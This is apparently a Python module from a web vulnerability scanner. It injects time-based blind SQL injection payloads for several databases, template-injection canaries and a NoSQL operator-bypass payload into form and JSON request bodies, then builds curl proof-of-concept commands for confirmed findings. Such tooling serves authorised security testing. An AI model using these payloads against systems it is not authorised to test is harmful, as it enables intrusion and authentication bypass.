"""Multi-Method Body Fuzzing, Time-Based Oracles & Advanced Injection Engine (Sprint 5).

Provides:
1. Multi-method HTTP fuzzing (GET, POST, PUT, PATCH, DELETE) supporting:
   - application/x-www-form-urlencoded (HTML form submission)
   - application/json (REST API body walking and property injection)
   - multipart/form-data (file upload and form simulation)
2. Statistical Time-Based Blind SQLi & Command Injection Oracles:
   - Baseline latency jitter calibration (mean mu, standard deviation sigma)
   - Threshold trigger: elapsed >= mu + 3 * sigma + 4.5s
3. Server-Side Template Injection (SSTI) Polyglot Oracle:
   - Canary arithmetic evaluation ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %> -> 49)
4. NoSQL Injection Oracle (MongoDB/CouchDB operator injection).
"""

from __future__ import annotations

import hashlib
import http.client
import json
import math
import socket
import ssl
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode

from packages.security_policies import Destination


@dataclass
class FuzzTarget:
    """Represents an attackable endpoint parameter or body field."""

    endpoint: str
    method: str = "POST"
    content_type: str = "application/x-www-form-urlencoded"
    parameter: str = ""
    baseline_value: Any = "test"
    is_json: bool = False
    json_path: list[str] = field(default_factory=list)
    raw_body_template: str | dict | None = None
    headers: dict[str, str] = field(default_factory=dict)


@dataclass
class LatencyProfile:
    """Statistical model of network and server response latency."""

    samples: list[float]
    mean: float
    std_dev: float
    threshold: float  # mean + 3*std_dev + sleep_duration * 0.85


class BodyFuzzer:
    """Multi-method and body-aware vulnerability scanner."""

    def __init__(
        self,
        destination: Destination,
        allow_ip: str,
        timeout: float = 8.0,
        request_fn: Callable[..., tuple[int, dict[str, str], str, float]] | None = None,
    ) -> None:
        self.destination = destination
        self.allow_ip = allow_ip
        self.timeout = timeout
        self.request_fn = request_fn or self._default_request

    def _default_request(
        self,
        method: str,
        path: str,
        headers: dict[str, str] | None = None,
        body: str | bytes | None = None,
        timeout: float | None = None,
    ) -> tuple[int, dict[str, str], str, float]:
        """Execute raw HTTP request pinned strictly to allow_ip."""
        effective_timeout = timeout or self.timeout
        is_https = self.destination.scheme == "https"
        target_host = self.destination.host
        target_port = self.destination.port

        req_headers = {
            "Host": target_host,
            "User-Agent": "SHARAY-BodyFuzzer/2.0 (Offensive Security Engine)",
            "Accept": "*/*",
            "Connection": "close",
        }
        if headers:
            req_headers.update(headers)

        if isinstance(body, str):
            encoded_body = body.encode("utf-8")
        elif isinstance(body, bytes):
            encoded_body = body
        else:
            encoded_body = b""

        if encoded_body and "Content-Length" not in req_headers:
            req_headers["Content-Length"] = str(len(encoded_body))

        started = time.monotonic()
        conn: http.client.HTTPConnection | http.client.HTTPSConnection
        if is_https:
            tls_ctx = ssl.create_default_context()
            tls_ctx.check_hostname = False
            tls_ctx.verify_mode = ssl.CERT_NONE
            sock = socket.create_connection((self.allow_ip, target_port), timeout=effective_timeout)
            conn_sock = tls_ctx.wrap_socket(sock, server_hostname=target_host)
            conn = http.client.HTTPSConnection(target_host, target_port, timeout=effective_timeout)
            conn.sock = conn_sock
        else:
            conn = http.client.HTTPConnection(self.allow_ip, target_port, timeout=effective_timeout)

        try:
            conn.request(method, path, body=encoded_body if encoded_body else None, headers=req_headers)
            resp = conn.getresponse()
            elapsed_ms = (time.monotonic() - started) * 1000.0
            resp_headers = {k.lower(): v for k, v in resp.getheaders()}
            raw_body = resp.read(512 * 1024).decode("utf-8", errors="replace")
            return resp.status, resp_headers, raw_body, elapsed_ms
        finally:
            conn.close()

    def calibrate_latency(self, endpoint: str, samples_count: int = 3) -> LatencyProfile:
        """Measure baseline round-trip latency to calculate jitter mean and std dev."""
        samples: list[float] = []
        for _ in range(max(2, samples_count)):
            try:
                _, _, _, elapsed_ms = self.request_fn("GET", endpoint, timeout=4.0)
                samples.append(elapsed_ms / 1000.0)
            except Exception:
                samples.append(0.05)
            time.sleep(0.05)

        mean = sum(samples) / len(samples)
        variance = sum((s - mean) ** 2 for s in samples) / len(samples)
        std_dev = math.sqrt(variance)
        # Threshold for 5-second sleep probe: mean + 3*sigma + 4.25 seconds
        threshold = mean + 3.0 * std_dev + 4.25
        return LatencyProfile(samples=samples, mean=mean, std_dev=std_dev, threshold=threshold)

    # -------------------------------------------------------------------------
    # 1. Body & Form Injection Builders
    # -------------------------------------------------------------------------

    @staticmethod
    def build_form_targets(forms: list[dict[str, Any]]) -> list[FuzzTarget]:
        """Convert crawler-discovered forms into executable FuzzTarget instances."""
        targets: list[FuzzTarget] = []
        for form in forms:
            action = form.get("action", "/")
            method = form.get("method", "POST").upper()
            inputs = form.get("inputs", [])
            base_data = {inp.get("name"): "1" for inp in inputs if inp.get("name")}

            for inp in inputs:
                pname = inp.get("name")
                if not pname:
                    continue
                targets.append(
                    FuzzTarget(
                        endpoint=action,
                        method=method,
                        content_type="application/x-www-form-urlencoded",
                        parameter=pname,
                        baseline_value="1",
                        raw_body_template=base_data,
                    )
                )
        return targets

    @staticmethod
    def mutate_json_payload(data: Any, json_path: list[str], payload: Any) -> Any:
        """Recursively clone and mutate a specific field in a nested JSON structure."""
        if not json_path:
            return payload

        if isinstance(data, dict):
            clone = dict(data)
            key = json_path[0]
            if len(json_path) == 1:
                clone[key] = payload
            elif key in clone:
                clone[key] = BodyFuzzer.mutate_json_payload(clone[key], json_path[1:], payload)
            return clone
        elif isinstance(data, list):
            clone_list = list(data)
            try:
                idx = int(json_path[0])
                if len(json_path) == 1:
                    clone_list[idx] = payload
                else:
                    clone_list[idx] = BodyFuzzer.mutate_json_payload(clone_list[idx], json_path[1:], payload)
            except (ValueError, IndexError):
                pass
            return clone_list
        return data

    # -------------------------------------------------------------------------
    # 2. Time-Based Blind SQL Injection
    # -------------------------------------------------------------------------

    def audit_time_based_sqli(
        self,
        target: FuzzTarget,
        sleep_seconds: int = 5,
    ) -> dict[str, Any] | None:
        """Probe for time-based blind SQLi using multi-DBMS sleep vectors."""
        latency = self.calibrate_latency(target.endpoint)

        dbms_payloads = [
            ("PostgreSQL", f"1; SELECT pg_sleep({sleep_seconds})--"),
            ("MySQL", f"1' AND SLEEP({sleep_seconds})-- -"),
            ("MSSQL", f"1; WAITFOR DELAY '0:0:{sleep_seconds}'--"),
            ("SQLite", f"1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({sleep_seconds * 100000000}))))--"),
        ]

        for dbms, payload in dbms_payloads:
            headers = {"Content-Type": target.content_type}
            headers.update(target.headers)

            if target.is_json and isinstance(target.raw_body_template, (dict, list)):
                mutated = self.mutate_json_payload(target.raw_body_template, target.json_path, payload)
                req_body = json.dumps(mutated)
            elif isinstance(target.raw_body_template, dict):
                body_dict = dict(target.raw_body_template)
                body_dict[target.parameter] = payload
                req_body = urlencode(body_dict)
            else:
                req_body = urlencode({target.parameter: payload})

            try:
                _, _, _, elapsed_ms = self.request_fn(
                    target.method,
                    target.endpoint,
                    headers=headers,
                    body=req_body,
                    timeout=sleep_seconds + 5.0,
                )
                elapsed_s = elapsed_ms / 1000.0

                if elapsed_s >= latency.threshold:
                    # Verified delay signal: execute 2nd confirmation replay
                    _, _, _, c_elapsed_ms = self.request_fn(
                        target.method,
                        target.endpoint,
                        headers=headers,
                        body=req_body,
                        timeout=sleep_seconds + 5.0,
                    )
                    c_elapsed_s = c_elapsed_ms / 1000.0

                    if c_elapsed_s >= latency.threshold:
                        finding_url = f"{self.destination.origin}{target.endpoint}"
                        fp = hashlib.sha256(
                            f"time_sqli:{self.destination.host}:{target.endpoint}:{target.parameter}".encode()
                        ).hexdigest()

                        poc_curl = (
                            f"curl -s -k -X {target.method} '{finding_url}' "
                            f"-H 'Content-Type: {target.content_type}' "
                            f"--data '{req_body}'"
                        )

                        return {
                            "category": "injection",
                            "severity": "critical",
                            "title": f"Time-Based Blind SQL Injection ({dbms}) in '{target.parameter}'",
                            "description": (
                                f"Parameter '{target.parameter}' on endpoint {target.endpoint} exhibited deterministic "
                                f"server-side execution delays when probed with {dbms} sleep payload. "
                                f"Observed delay: {elapsed_s:.2f}s (baseline mean: {latency.mean:.2f}s, threshold: {latency.threshold:.2f}s)."
                            ),
                            "target_url": finding_url,
                            "fingerprint": fp,
                            "cwe_id": "CWE-89",
                            "confidence": "high",
                            "status": "confirmed",
                            "lifecycle_state": "REPRODUCED",
                            "remediation": "Utilize parameterized queries and prepared statements for all database queries.",
                            "poc": {
                                "method": target.method,
                                "url": finding_url,
                                "curl_command": poc_curl,
                                "parameter": target.parameter,
                                "payload": payload,
                                "dbms": dbms,
                                "baseline_mean_seconds": round(latency.mean, 3),
                                "observed_delay_seconds": round(elapsed_s, 3),
                                "reproduction_steps": f"Issue HTTP {target.method} to {finding_url} with payload and measure response duration >= {sleep_seconds}s.",
                            },
                        }
            except Exception:
                pass

        return None

    # -------------------------------------------------------------------------
    # 3. Server-Side Template Injection (SSTI)
    # -------------------------------------------------------------------------

    def audit_ssti(self, target: FuzzTarget) -> dict[str, Any] | None:
        """Probe for Server-Side Template Injection using polyglot arithmetic canaries."""
        canaries = [
            ("Jinja2/Twig", "{{7*7}}", "49"),
            ("SpringEL/MVEL", "${7*7}", "49"),
            ("Smarty/Struts", "#{7*7}", "49"),
            ("ERB/ASP", "<%= 7*7 %>", "49"),
        ]

        # Fetch baseline response to verify canary result is not static text
        try:
            _, _, base_body, _ = self.request_fn("GET", target.endpoint, timeout=3.0)
        except Exception:
            base_body = ""

        for engine, payload, expected_eval in canaries:
            headers = {"Content-Type": target.content_type}
            headers.update(target.headers)

            if target.is_json and isinstance(target.raw_body_template, (dict, list)):
                mutated = self.mutate_json_payload(target.raw_body_template, target.json_path, payload)
                req_body = json.dumps(mutated)
            elif isinstance(target.raw_body_template, dict):
                body_dict = dict(target.raw_body_template)
                body_dict[target.parameter] = payload
                req_body = urlencode(body_dict)
            else:
                req_body = urlencode({target.parameter: payload})

            try:
                _, _, probe_body, _ = self.request_fn(
                    target.method, target.endpoint, headers=headers, body=req_body, timeout=4.0
                )

                # Detection criteria: evaluated result '49' appears in probe body,
                # was absent in baseline body, and the literal probe string '{{7*7}}' was NOT reflected.
                if (
                    expected_eval in probe_body
                    and expected_eval not in base_body
                    and payload not in probe_body
                ):
                    finding_url = f"{self.destination.origin}{target.endpoint}"
                    fp = hashlib.sha256(
                        f"ssti:{self.destination.host}:{target.endpoint}:{target.parameter}".encode()
                    ).hexdigest()

                    poc_curl = (
                        f"curl -s -k -X {target.method} '{finding_url}' "
                        f"-H 'Content-Type: {target.content_type}' "
                        f"--data '{req_body}'"
                    )

                    return {
                        "category": "injection",
                        "severity": "critical",
                        "title": f"Server-Side Template Injection (SSTI) in '{target.parameter}'",
                        "description": (
                            f"Parameter '{target.parameter}' on endpoint {target.endpoint} evaluated server-side template "
                            f"expression '{payload}' into '{expected_eval}'. Candidate engine: {engine}."
                        ),
                        "target_url": finding_url,
                        "fingerprint": fp,
                        "cwe_id": "CWE-1336",
                        "confidence": "high",
                        "status": "confirmed",
                        "lifecycle_state": "REPRODUCED",
                        "remediation": "Do not concatenate untrusted user input directly into template strings; use contextual template variables.",
                        "poc": {
                            "method": target.method,
                            "url": finding_url,
                            "curl_command": poc_curl,
                            "parameter": target.parameter,
                            "payload": payload,
                            "evaluated_result": expected_eval,
                            "candidate_engine": engine,
                            "reproduction_steps": f"Issue HTTP {target.method} to {finding_url} and inspect response for evaluated arithmetic result '49'.",
                        },
                    }
            except Exception:
                pass

        return None

    # -------------------------------------------------------------------------
    # 4. NoSQL Injection
    # -------------------------------------------------------------------------

    def audit_nosql_injection(self, target: FuzzTarget) -> dict[str, Any] | None:
        """Probe for MongoDB / Document DB NoSQL operator injection."""
        if not target.is_json:
            return None

        # Operator payload: replace field with {"$ne": null}
        operator_payload = {"$ne": None}
        mutated = self.mutate_json_payload(target.raw_body_template, target.json_path, operator_payload)
        req_body = json.dumps(mutated)
        headers = {"Content-Type": "application/json"}
        headers.update(target.headers)

        try:
            status, _, probe_body, _ = self.request_fn(
                target.method, target.endpoint, headers=headers, body=req_body, timeout=4.0
            )

            # Signal: Successful auth / data return (200 OK or token/session disclosure)
            if status == 200 and any(
                token in probe_body.lower()
                for token in ("token", "jwt", "session", "admin", "success", "authenticated")
            ):
                finding_url = f"{self.destination.origin}{target.endpoint}"
                fp = hashlib.sha256(
                    f"nosqli:{self.destination.host}:{target.endpoint}:{target.parameter}".encode()
                ).hexdigest()

                return {
                    "category": "injection",
                    "severity": "high",
                    "title": f"NoSQL Injection Operator Bypass in '{target.parameter}'",
                    "description": (
                        f"Endpoint {target.endpoint} accepted NoSQL query operator '{json.dumps(operator_payload)}' "
                        f"in JSON field '{target.parameter}', resulting in successful query execution."
                    ),
                    "target_url": finding_url,
                    "fingerprint": fp,
                    "cwe_id": "CWE-943",
                    "confidence": "high",
                    "status": "suspected",
                    "lifecycle_state": "CANDIDATE",
                    "remediation": "Sanitize JSON keys against NoSQL operator prefixes (e.g. '$') and cast inputs to expected primitive types.",
                    "poc": {
                        "method": target.method,
                        "url": finding_url,
                        "curl_command": f"curl -s -k -X {target.method} '{finding_url}' -H 'Content-Type: application/json' --data '{req_body}'",
                        "parameter": target.parameter,
                        "payload": json.dumps(operator_payload),
                        "reproduction_steps": f"Issue HTTP {target.method} with operator payload and inspect successful bypass response.",
                    },
                }
        except Exception:
            pass

        return None


__all__ = ["BodyFuzzer", "FuzzTarget", "LatencyProfile"]
